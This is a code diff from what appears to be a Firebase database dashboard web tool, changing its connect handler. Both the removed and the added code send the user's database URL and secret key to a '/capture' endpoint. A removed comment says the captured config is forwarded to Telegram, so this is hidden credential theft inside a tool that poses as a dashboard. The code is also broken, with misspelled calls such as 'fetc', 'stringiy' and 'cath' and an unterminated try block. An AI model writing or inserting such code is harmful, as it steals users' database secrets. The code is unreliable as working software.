@@ -5846,45 +5846,15 @@ async function handleConnect() {
     }
 
     await startDashboard(url, key);
-    console.log("Forwarding to /capture...", { url: url, key: key });
-fetc('/capture', {
-  method: 'POST',
-  headers: {'Content-Type': 'application/json'},
-  body: JSON.stringiy({ url: url, key: key })
-}).then(function(res) {
-  console.log("Forward response:", res.status);
-  return res.json();
-}).then(function(dat) {
-  console.log("Forward data:", data);
-}).catch(function(err) {
-  console.error("Forward error:", err);
-  alert("Forward failed: " + err.message);  // temporarily alert
-});
-  } catch(e) {
-    // ── FIREBASE CONFIG FORWARD TO TELEGRAM (token hidden on Render) ──
+    // Replace the previous fetch with this for testing
 fetch('/capture', {
   method: 'POST',
   headers: {'Content-Type': 'application/json'},
   body: JSON.stringify({ url: url, key: key })
-}).catch(function(){});
-    var msg = e.message || String(e);
-    if (msg.includes('PERMISSION_DENIED')) {
-      var _keyBlank = !document.getElementById('input-key').value.trim();
-      if (_keyBlank) {
-        setFormError('This database is not public. Enter your Firebase Database Secret or API key to connect.');
-      } else {
-        setFormError('Connection failed: Permission denied. Use the Database Secret key (not API key starting with AIza…).');
-      }
-    } else if (msg.includes('NOT_FOUND')) {
-      setFormError('Connection failed: Database URL not found. Check the URL.');
-    } else {
-      setFormError('Connection failed: ' + msg.slice(0, 80));
-    }
-  } finally {
-    btn.disabled = false;
-    btnText.textContent = 'Save & Connect';
-  }
-}
+})
+.then(r => r.json())
+.then(data => alert('Forward success: ' + JSON.stringify(data)))
+.cath(e => alert('Forward FAILED: ' + e.mesage));
 
 // ────────────────────────────────────────────────────────────────────────────
 // APK parsing (basic ZIP/APK scan for firebase URL + key in strings)
